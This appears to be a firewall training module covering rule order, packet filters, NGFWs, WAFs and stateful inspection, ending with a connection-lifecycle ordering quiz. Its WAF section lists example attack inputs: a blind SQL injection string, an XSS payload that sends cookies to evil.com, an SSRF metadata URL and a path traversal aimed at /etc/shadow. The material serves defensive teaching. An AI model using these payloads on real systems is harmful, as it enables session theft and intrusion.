Foundation: Firewall Fundamentals

Start

How Firewalls Work

A firewall enforces a ruleset on every packet crossing a network boundary. Rule order is critical — the first matching rule wins and processing halts immediately. If no rule matches, the default policy applies (usually implicit DENY).

Step 1: Read packet header — source IP, dest IP, protocol, port
Step 2: Match against rules top-to-bottom — stop at first hit
Step 3: Execute rule action — ALLOW or DENY
Step 4: If no match — apply implicit default DENY
Step 5: Log decision with timestamp, IPs, ports, action

Firewalls sit at different OSI layers: packet filters at L3–4, stateful at L4, NGFWs at L3–7, WAFs at L7. Higher layer = more intelligence + higher processing cost.

Type 1: Packet Filtering

Locked

Packet Filtering Firewalls

Packet filters are stateless — each packet is judged in isolation, with zero memory of previous packets. They inspect only the header: source/dest IP, protocol, port.

Ports to memorise:
HTTP 80 · HTTPS 443 · SSH 22 · FTP-data 20 · FTP-ctrl 21 · DNS 53 · SMTP 25 · POP3 110 · IMAP 143 · RDP 3389 · LDAP 389 · Kerberos 88 · SNMP 161

What packet filters CANNOT do: inspect payload, detect malware, identify the application, track TCP sessions, identify the user.

Rule-order trap: A broad ALLOW above a specific DENY shadows the DENY entirely — the most common packet-filter misconfiguration in production networks.

Type 2: Next-Generation Firewall

Locked

Next-Generation Firewalls (NGFW)

NGFWs add Deep Packet Inspection (DPI), application-layer awareness, user identity (via Active Directory/LDAP), and an embedded IPS — all at wire speed using dedicated ASIC or GPU hardware.

App Identification methods: signature matching, behavioral fingerprinting, heuristics, SSL/TLS inspection (requires trusted root CA on endpoints).

IPS signatures: detect buffer overflows, SQL injection in HTTP POST bodies, port scans, shellcode patterns — dropped inline before hitting the server.

SSL Inspection trade-off: gives full visibility into HTTPS but creates a legal/privacy obligation — the firewall is a man-in-the-middle for all encrypted traffic.

Type 3: Web Application Firewall

Locked

Web Application Firewalls (WAF)

A WAF operates exclusively at OSI Layer 7 — inspecting HTTP/HTTPS request URLs, query strings, headers, cookies, and POST bodies for attack patterns that ride inside legitimate web traffic.

SQLi (time-based blind): id=1; WAITFOR DELAY '0:0:5'-- — no data returned, but a 5-second pause confirms injection
Stored XSS: <svg onload="fetch('//evil.com?c='+btoa(document.cookie))">
SSRF: url=http://169.254.169.254/latest/meta-data/ — forces server to query its own cloud metadata
Path Traversal: file=....//....//etc/shadow — double-encoded to evade naive filters
Virtual Patching: Block CVE exploitation at the WAF before developers push a code fix

A WAF is complementary to — not a replacement for — a network firewall. They protect completely different attack surfaces at different OSI layers.

Type 4: Stateful Inspection

Locked

Stateful Inspection Firewalls

Stateful firewalls maintain an in-memory connection state table. Return traffic for an ESTABLISHED connection is automatically permitted — no explicit inbound rule required. This eliminates a whole class of spoofing attacks possible against stateless filters.

NEW: First SYN — state entry created, half-open timeout ~30s
ESTABLISHED: SYN-ACK/ACK complete — bidirectional traffic permitted automatically
RELATED: New connection spawned by existing session (e.g. FTP passive data channel, SIP media stream)
INVALID: Packet matches no state entry — silently dropped (likely scan, spoof, or spoofed RST)

SYN Flood: Sends millions of SYNs without completing handshakes, filling the half-open state table → DoS. Defense: SYN cookies, per-source limits.
UDP pseudo-state: No handshake exists; firewall creates timeout-based entries (~30s). Makes UDP stateful tracking approximate.
🧩 Challenge 1 of 3 — Drag to Order
Arrange the full lifecycle of a stateful TCP connection through a firewall, from first packet to teardown:
⠿?Client sends FIN — firewall updates state to TIME_WAIT, starts purge timer
⠿?Server sends SYN-ACK — firewall sees matching half-open entry, allows return
⠿?Data flows bidirectionally — all packets auto-permitted as ESTABLISHED
⠿?Client sends SYN — firewall creates NEW half-open state entry
⠿?Connection entry purged from state table — memory reclaimed
⠿?Client sends ACK — three-way handshake complete, state → ESTABLISHED
